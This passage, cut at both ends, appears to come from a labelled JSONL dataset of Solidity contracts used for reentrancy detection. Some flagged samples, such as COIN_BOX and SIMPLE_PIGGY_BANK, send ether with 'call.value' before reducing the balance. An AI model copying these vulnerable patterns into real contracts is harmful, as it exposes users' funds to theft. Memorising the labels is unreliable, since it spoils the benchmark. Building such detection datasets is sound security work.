emergencyTransfer(uint256 code, address newOwner) public payable { if ((code == emergencyCode) && (msg.value == emergencyAmount) && (newOwner != address(0))) { owner = msg.sender; } } } "}
{"sol name": "21755.sol", "label": 1, "first path": "function Collect(uint _am) public payable  { var acc = Acc[msg.sender]; if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) { if(msg.sender.call.value(_am)())  { acc.balance-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); function()     public     payable   { Put(0); contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "second path": "function Collect(uint _am) public payable  { var acc = Acc[msg.sender]; if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) { if(msg.sender.call.value(_am)())  { acc.balance-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); function()     public     payable   { Put(0); contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "third path": "function Collect(uint _am) public payable  { var acc = Acc[msg.sender]; if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) { if(msg.sender.call.value(_am)())  { acc.balance-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); function()     public     payable   { Put(0); contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "long path": "pragma solidity ^0.4.19; contract COIN_BOX { struct Holder { uint unlockTime; uint balance; } mapping (address => Holder) public Acc; uint public MinSum; Log LogFile; bool intitalized; function SetMinSum(uint _val) public { if(intitalized)throw; MinSum = _val; } function SetLogFile(address _log) public { if(intitalized)throw; LogFile = Log(_log); } function Initialized() public { intitalized = true; } function Put(uint _lockTime) public payable { var acc = Acc[msg.sender]; acc.balance += msg.value; if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime; LogFile.AddMessage(msg.sender,msg.value,\"Put\"); } function Collect(uint _am) public payable  { var acc = Acc[msg.sender]; if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) { if(msg.sender.call.value(_am)())  { acc.balance-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); } } } function()     public     payable   { Put(0); } } contract Log { struct Message { address Sender; string  Data; uint Val; uint  Time; } Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data)    public    { LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); } } "}
{"sol name": "16884.sol", "label": 0, "first path": "function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() { require(_contract.call.value(_amount)()); ", "second path": "function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() { require(_contract.call.value(_amount)()); ", "third path": "function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() { require(_contract.call.value(_amount)()); ", "long path": "pragma solidity ^0.4.13; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract HasManager { address public manager; modifier onlyManager { require(msg.sender == manager); _; } function transferManager(address _newManager) public onlyManager() { require(_newManager != address(0)); manager = _newManager; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract Whitelist is Ownable { mapping(address => bool) public whitelist; address public whitelistManager; function AddToWhiteList(address _addr) public { require(msg.sender == whitelistManager || msg.sender == owner); whitelist[_addr] = true; } function AssignWhitelistManager(address _addr) public onlyOwner { whitelistManager = _addr; } modifier whitelistedOnly { require(whitelist[msg.sender]); _; } } contract WithBonusPeriods is Ownable { uint256 constant INVALID_FROM_TIMESTAMP = 1000000000000; uint256 constant INFINITY_TO_TIMESTAMP= 1000000000000; struct BonusPeriod { uint256 fromTimestamp; uint256 toTimestamp; uint256 bonusNumerator; uint256 bonusDenominator; } BonusPeriod[] public bonusPeriods; BonusPeriod currentBonusPeriod; function WithBonusPeriods() public { initBonuses(); } function BonusPeriodsCount() public view returns (uint8) { return uint8(bonusPeriods.length); } function BonusPeriodFor(uint256 timestamp) public view returns (bool ongoing, uint256 from, uint256 to, uint256 num, uint256 den) { for(uint i = 0; i < bonusPeriods.length; i++) if (bonusPeriods[i].fromTimestamp <= timestamp && bonusPeriods[i].toTimestamp >= timestamp) return (true, bonusPeriods[i].fromTimestamp, bonusPeriods[i].toTimestamp, bonusPeriods[i].bonusNumerator, bonusPeriods[i].bonusDenominator); return (false, 0, 0, 0, 0); } function initBonusPeriod(uint256 from, uint256 to, uint256 num, uint256 den) internal  { bonusPeriods.push(BonusPeriod(from, to, num, den)); } function initBonuses() internal { initBonusPeriod(1525132800, 1525737599, 20, 100); initBonusPeriod(1525737600, 1526342399, 15, 100); initBonusPeriod(1526342400, 1526947199, 10, 100); initBonusPeriod(1526947200, 1527551999, 5, 100); } function updateCurrentBonusPeriod() internal  { if (currentBonusPeriod.fromTimestamp <= block.timestamp && currentBonusPeriod.toTimestamp >= block.timestamp) return; currentBonusPeriod.fromTimestamp = INVALID_FROM_TIMESTAMP; for(uint i = 0; i < bonusPeriods.length; i++) if (bonusPeriods[i].fromTimestamp <= block.timestamp && bonusPeriods[i].toTimestamp >= block.timestamp) { currentBonusPeriod = bonusPeriods[i]; return; } } } contract ICrowdsaleProcessor is Ownable, HasManager { modifier whenCrowdsaleAlive() { require(isActive()); _; } modifier whenCrowdsaleFailed() { require(isFailed()); _; } modifier whenCrowdsaleSuccessful() { require(isSuccessful()); _; } modifier hasntStopped() { require(!stopped); _; } modifier hasBeenStopped() { require(stopped); _; } modifier hasntStarted() { require(!started); _; } modifier hasBeenStarted() { require(started); _; } uint256 constant public MIN_HARD_CAP = 1 ether; uint256 constant public MIN_CROWDSALE_TIME = 3 days; uint256 constant public MAX_CROWDSALE_TIME = 50 days; bool public started; bool public stopped; uint256 public totalCollected; uint256 public totalSold; uint256 public minimalGoal; uint256 public hardCap; uint256 public duration; uint256 public startTimestamp; uint256 public endTimestamp; function deposit() public payable {} function getToken() public returns(address); function mintETHRewards(address _contract, uint256 _amount) public onlyManager(); function mintTokenRewards(address _contract, uint256 _amount) public onlyManager(); function releaseTokens() public onlyManager() hasntStopped() whenCrowdsaleSuccessful(); function stop() public onlyManager() hasntStopped(); function start(uint256 _startTimestamp, uint256 _endTimestamp, address _fundingAddress) public onlyManager() hasntStarted() hasntStopped(); function isFailed() public constant returns (bool); function isActive() public constant returns (bool); function isSuccessful() public constant returns (bool); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract Crowdsaled is Ownable { address public crowdsaleContract = address(0); function Crowdsaled() public { } modifier onlyCrowdsale{ require(msg.sender == crowdsaleContract); _; } modifier onlyCrowdsaleOrOwner { require((msg.sender == crowdsaleContract) || (msg.sender == owner)); _; } function setCrowdsale(address crowdsale) public onlyOwner() { crowdsaleContract = crowdsale; } } contract LetItPlayToken is Crowdsaled, StandardToken { uint256 public totalSupply; string public name; string public symbol; uint8 public decimals; address public forSale; address public preSale; address public ecoSystemFund; address public founders; address public team; address public advisers; address public bounty; address public eosShareDrop; bool releasedForTransfer; uint256 private shift; function LetItPlayToken( address _forSale, address _ecoSystemFund, address _founders, address _team, address _advisers, address _bounty, address _preSale, address _eosShareDrop ) public { name = \"LetItPlay Token\"; symbol = \"PLAY\"; decimals = 8; shift = uint256(10)**decimals; totalSupply = 1000000000 * shift; forSale = _forSale; ecoSystemFund = _ecoSystemFund; founders = _founders; team = _team; advisers = _advisers; bounty = _bounty; eosShareDrop = _eosShareDrop; preSale = _preSale; balances[forSale] = totalSupply * 59 / 100; balances[ecoSystemFund] = totalSupply * 15 / 100; balances[founders] = totalSupply * 15 / 100; balances[team] = totalSupply * 5 / 100; balances[advisers] = totalSupply * 3 / 100; balances[bounty] = totalSupply * 1 / 100; balances[preSale] = totalSupply * 1 / 100; balances[eosShareDrop] = totalSupply * 1 / 100; } function transferByOwner(address from, address to, uint256 value) public onlyOwner { require(balances[from] >= value); balances[from] = balances[from].sub(value); balances[to] = balances[to].add(value); emit Transfer(from, to, value); } function transferByCrowdsale(address to, uint256 value) public onlyCrowdsale { require(balances[forSale] >= value); balances[forSale] = balances[forSale].sub(value); balances[to] = balances[to].add(value); emit Transfer(forSale, to, value); } function transferFromByCrowdsale(address _from, address _to, uint256 _value) public onlyCrowdsale returns (bool) { return super.transferFrom(_from, _to, _value); } function releaseForTransfer() public onlyCrowdsaleOrOwner { require(!releasedForTransfer); releasedForTransfer = true; } function transfer(address _to, uint256 _value) public returns (bool) { require(releasedForTransfer); return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(releasedForTransfer); return super.transferFrom(_from, _to, _value); } function burn(uint256 value) public  onlyOwner { require(value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(value); balances[address(0)] = balances[address(0)].add(value); emit Transfer(msg.sender, address(0), value); } } contract BasicCrowdsale is ICrowdsaleProcessor { event CROWDSALE_START(uint256 startTimestamp, uint256 endTimestamp, address fundingAddress); address public fundingAddress; function BasicCrowdsale( address _owner, address _manager ) public { owner = _owner; manager = _manager; } function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() { require(_contract.call.value(_amount)()); } function stop() public onlyManager() hasntStopped()  { if (started) { require(!isFailed()); require(!isSuccessful()); } stopped = true; } function start( uint256 _startTimestamp, uint256 _endTimestamp, address _fundingAddress ) public onlyManager() hasntStarted() hasntStopped() { require(_fundingAddress != address(0)); require(_startTimestamp >= block.timestamp); require(_endTimestamp > _startTimestamp); duration = _endTimestamp - _startTimestamp; require(duration >= MIN_CROWDSALE_TIME && duration <= MAX_CROWDSALE_TIME); startTimestamp = _startTimestamp; endTimestamp = _endTimestamp; fundingAddress = _fundingAddress; started = true; emit CROWDSALE_START(_startTimestamp, _endTimestamp, _fundingAddress); } function isFailed() public constant returns(bool) { return ( started && block.timestamp >= endTimestamp && totalCollected < minimalGoal ); } function isActive() public constant returns(bool) { return ( started && totalCollected < hardCap && block.timestamp >= startTimestamp && block.timestamp < endTimestamp ); } function isSuccessful() public constant returns(bool) { return ( totalCollected >= hardCap || (block.timestamp >= endTimestamp && totalCollected >= minimalGoal) ); } } contract Crowdsale is BasicCrowdsale, Whitelist, WithBonusPeriods { struct Investor { uint256 weiDonated; uint256 tokensGiven; } mapping(address => Investor) participants; uint256 public tokenRateWei; LetItPlayToken public token; function Crowdsale( uint256 _minimalGoal, uint256 _hardCap, uint256 _tokenRateWei, address _token ) public BasicCrowdsale(msg.sender, msg.sender) { minimalGoal = _minimalGoal; hardCap = _hardCap; tokenRateWei = _tokenRateWei; token = LetItPlayToken(_token); } function getToken() public returns(address) { return address(token); } function mintTokenRewards( address _contract, uint256 _amount ) public onlyManager() { token.transferByCrowdsale(_contract, _amount); } function releaseTokens() public onlyManager() hasntStopped() whenCrowdsaleSuccessful() { token.releaseForTransfer(); } function () payable public { require(msg.value > 0); sellTokens(msg.sender, msg.value); } function sellTokens(address _recepient, uint256 _value) internal hasBeenStarted() hasntStopped() whenCrowdsaleAlive() whitelistedOnly() { uint256 newTotalCollected = totalCollected + _value; if (hardCap < newTotalCollected) { uint256 refund = newTotalCollected - hardCap; uint256 diff = _value - refund; _recepient.transfer(refund); _value = diff; } uint256 tokensSold = _value * uint256(10)**token.decimals() / tokenRateWei; updateCurrentBonusPeriod(); if (currentBonusPeriod.fromTimestamp != INVALID_FROM_TIMESTAMP) tokensSold += tokensSold * currentBonusPeriod.bonusNumerator / currentBonusPeriod.bonusDenominator; token.transferByCrowdsale(_recepient, tokensSold); participants[_recepient].weiDonated += _value; participants[_recepient].tokensGiven += tokensSold; totalCollected += _value; totalSold += tokensSold; } function withdraw(uint256 _amount) public onlyOwner() hasntStopped() whenCrowdsaleSuccessful() { require(_amount <= address(this).balance); fundingAddress.transfer(_amount); } function refund() public { require(stopped || isFailed()); uint256 weiDonated = participants[msg.sender].weiDonated; uint256 tokens = participants[msg.sender].tokensGiven; require(weiDonated > 0); participants[msg.sender].weiDonated = 0; participants[msg.sender].tokensGiven = 0; msg.sender.transfer(weiDonated); token.transferFromByCrowdsale(msg.sender, token.forSale(), tokens); } } "}
{"sol name": "23803.sol", "label": 0, "first path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "second path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "third path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "long path": "pragma solidity ^0.4.11; contract TRUEToken  { string public constant name = \"TRUE Token\"; string public constant symbol = \"TRUE\"; uint public constant decimals = 18; uint256 _totalSupply    = 100000000 * 10**decimals; function totalSupply() constant returns (uint256 supply) { return _totalSupply; } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping(address => uint256) balances; mapping(address => mapping (address => uint256)) allowed; uint public baseStartTime; address public founder = 0x0; uint256 public distributed = 0; event AllocateFounderTokens(address indexed sender); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); function TRUEToken(address _founder) { founder = _founder; } function setStartTime(uint _startTime) { if (msg.sender!=founder) revert(); baseStartTime = _startTime; } function distribute(uint256 _amount, address _to) { if (msg.sender!=founder) revert(); if (distributed + _amount > _totalSupply) revert(); distributed += _amount; balances[_to] += _amount; Transfer(this, _to, _amount); } function transfer(address _to, uint256 _value) returns (bool success) { if (now < baseStartTime) revert(); if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function changeFounder(address newFounder) { if (msg.sender!=founder) revert(); founder = newFounder; } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (msg.sender != founder) revert(); if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function () payable { if (!founder.call.value(msg.value)()) revert(); } function kill() { if (msg.sender == founder) { suicide(founder); } } } "}
{"sol name": "22074.sol", "label": 1, "first path": "function Collect(uint _am) public payable { if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) { msg.sender.call.value(_am); Bal[msg.sender]-=_am; ", "second path": "function Collect(uint _am) public payable { if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) { msg.sender.call.value(_am); Bal[msg.sender]-=_am; ", "third path": "function Collect(uint _am) public payable { if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) { msg.sender.call.value(_am); Bal[msg.sender]-=_am; ", "long path": "pragma solidity ^0.4.19; contract SIMPLE_PIGGY_BANK { address creator = msg.sender; mapping (address => uint) public Bal; uint public MinSum = 1 ether; function()    public     payable    { Bal[msg.sender]+=msg.value; } function Collect(uint _am) public payable { if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) { msg.sender.call.value(_am); Bal[msg.sender]-=_am; } } function Break()    public    payable    { if(msg.sender==creator && this.balance>= MinSum)   { selfdestruct(msg.sender); } } } "}
{"sol name": "39326.sol", "label": 0, "first path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "second path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "third path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "long path": "pragma solidity ^0.4.4; contract Owned { address public owner; function setOwner(address _owner) onlyOwner { owner = _owner; } modifier onlyOwner { if (msg.sender != owner) throw; _; } } contract Destroyable { address public hammer; function setHammer(address _hammer) onlyHammer { hammer = _hammer; } function destroy() onlyHammer { suicide(msg.sender); } modifier onlyHammer { if (msg.sender != hammer) throw; _; } } contract Object is Owned, Destroyable { function Object() { owner  = msg.sender; hammer = msg.sender; } } contract ERC20 { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256); function transfer(address _to, uint256 _value) returns (bool); function transferFrom(address _from, address _to, uint256 _value) returns (bool); function approve(address _spender, uint256 _value) returns (bool); function allowance(address _owner, address _spender) constant returns (uint256); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract Recipient { event ReceivedEther(address indexed sender, uint256 indexed amount); event ReceivedTokens(address indexed from, uint256 indexed value, address indexed token, bytes extraData); function receiveApproval(address _from, uint256 _value, ERC20 _token, bytes _extraData) { if (!_token.transferFrom(_from, this, _value)) throw; ReceivedTokens(_from, _value, _token, _extraData); } function () payable { ReceivedEther(msg.sender, msg.value); } } contract Congress is Object, Recipient { uint256 public minimumQuorum; uint256 public debatingPeriodInMinutes; int256 public majorityMargin; Proposal[] public proposals; function numProposals() constant returns (uint256) { return proposals.length; } Member[] public members; mapping(address => uint256) public memberId; event ProposalAdded(uint256 indexed proposal, address indexed recipient, uint256 indexed amount, string description); event Voted(uint256 indexed proposal, bool    indexed position, address indexed voter, string justification); event ProposalTallied(uint256 indexed proposal, uint256 indexed quorum, bool    indexed active); event MembershipChanged(address indexed member, bool    indexed isMember); event ChangeOfRules(uint256 indexed minimumQuorum, uint256 indexed debatingPeriodInMinutes, int256  indexed majorityMargin); struct Proposal { address recipient; uint256 amount; string  description; uint256 votingDeadline; bool    executed; bool    proposalPassed; uint256 numberOfVotes; int256  currentResult; bytes32 proposalHash; Vote[]  votes; mapping(address => bool) voted; } struct Member { address member; string  name; uint256 memberSince; } struct Vote { bool    inSupport; address voter; string  justification; } modifier onlyMembers { if (memberId[msg.sender] == 0) throw; _; } function Congress( uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256  marginOfVotesForMajority, address congressLeader ) { changeVotingRules(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority); addMember(0, ''); if (congressLeader != 0) addMember(congressLeader, 'The Founder'); } function addMember(address targetMember, string memberName) onlyOwner { if (memberId[targetMember] != 0) throw; memberId[targetMember] = members.length; members.push(Member({member:      targetMember, memberSince: now, name:        memberName})); MembershipChanged(targetMember, true); } function removeMember(address targetMember) onlyOwner { if (memberId[targetMember] == 0) throw; uint256 targetId = memberId[targetMember]; uint256 lastId   = members.length - 1; Member memory moved    = members[lastId]; members[targetId]      = moved; memberId[moved.member] = targetId; memberId[targetMember] = 0; delete members[lastId]; --members.length; MembershipChanged(targetMember, false); } function changeVotingRules( uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256  marginOfVotesForMajority ) onlyOwner { minimumQuorum           = minimumQuorumForProposals; debatingPeriodInMinutes = minutesForDebate; majorityMargin          = marginOfVotesForMajority; ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, majorityMargin); } function newProposal( address beneficiary, uint256 amount, string  jobDescription, bytes   transactionBytecode ) onlyMembers returns (uint256 id) { id               = proposals.length++; Proposal p       = proposals[id]; p.recipient      = beneficiary; p.amount         = amount; p.description    = jobDescription; p.proposalHash   = sha3(beneficiary, amount, transactionBytecode); p.votingDeadline = now + debatingPeriodInMinutes * 1 minutes; p.executed       = false; p.proposalPassed = false; p.numberOfVotes  = 0; ProposalAdded(id, beneficiary, amount, jobDescription); } function checkProposalCode( uint256 id, address beneficiary, uint256 amount, bytes   transactionBytecode ) constant returns (bool codeChecksOut) { return proposals[id].proposalHash == sha3(beneficiary, amount, transactionBytecode); } function vote( uint256 id, bool    supportsProposal, string  justificationText ) onlyMembers returns (uint256 vote) { Proposal p = proposals[id]; if (p.voted[msg.sender] == true) throw; p.voted[msg.sender] = true; p.numberOfVotes++; if (supportsProposal) { p.currentResult++; } else { p.currentResult--; } Voted(id,  supportsProposal, msg.sender, justificationText); } function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; } ProposalTallied(id, p.numberOfVotes, p.proposalPassed); } } library CreatorCongress { function create(uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256 marginOfVotesForMajority, address congressLeader) returns (Congress) { return new Congress(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority, congressLeader); } function version() constant returns (string) { return \"v0.6.3\"; } function abi() constant returns (string) { return '[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"proposals\",\"outputs\":[{\"name\":\"recipient\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"description\",\"type\":\"string\"},{\"name\":\"votingDeadline\",\"type\":\"uint256\"},{\"name\":\"executed\",\"type\":\"bool\"},{\"name\":\"proposalPassed\",\"type\":\"bool\"},{\"name\":\"numberOfVotes\",\"type\":\"uint256\"},{\"name\":\"currentResult\",\"type\":\"int256\"},{\"name\":\"proposalHash\",\"type\":\"bytes32\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetMember\",\"type\":\"address\"}],\"name\":\"removeMember\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"executeProposal\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"memberId\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"numProposals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hammer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"members\",\"outputs\":[{\"name\":\"member\",\"type\":\"address\"},{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"memberSince\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"debatingPeriodInMinutes\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minimumQuorum\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"},{\"name\":\"_token\",\"type\":\"address\"},{\"name\":\"_extraData\",\"type\":\"bytes\"}],\"name\":\"receiveApproval\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"majorityMargin\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"beneficiary\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"jobDescription\",\"type\":\"string\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"newProposal\",\"outputs\":[{\"name\":\"id\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"minimumQuorumForProposals\",\"type\":\"uint256\"},{\"name\":\"minutesForDebate\",\"type\":\"uint256\"},{\"name\":\"marginOfVotesForMajority\",\"type\":\"int256\"}],\"name\":\"changeVotingRules\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetMember\",\"type\":\"address\"},{\"name\":\"memberName\",\"type\":\"string\"}],\"name\":\"addMember\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_hammer\",\"type\":\"address\"}],\"name\":\"setHammer\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"supportsProposal\",\"type\":\"bool\"},{\"name\":\"justificationText\",\"type\":\"string\"}],\"name\":\"vote\",\"outputs\":[{\"name\":\"vote\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"beneficiary\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"checkProposalCode\",\"outputs\":[{\"name\":\"codeChecksOut\",\"type\":\"bool\"}],\"payable\":false,\"type\":\"function\"},{\"inputs\":[{\"name\":\"minimumQuorumForProposals\",\"type\":\"uint256\"},{\"name\":\"minutesForDebate\",\"type\":\"uint256\"},{\"name\":\"marginOfVotesForMajority\",\"type\":\"int256\"},{\"name\":\"congressLeader\",\"type\":\"address\"}],\"payable\":false,\"type\":\"constructor\"},{\"payable\":true,\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"description\",\"type\":\"string\"}],\"name\":\"ProposalAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\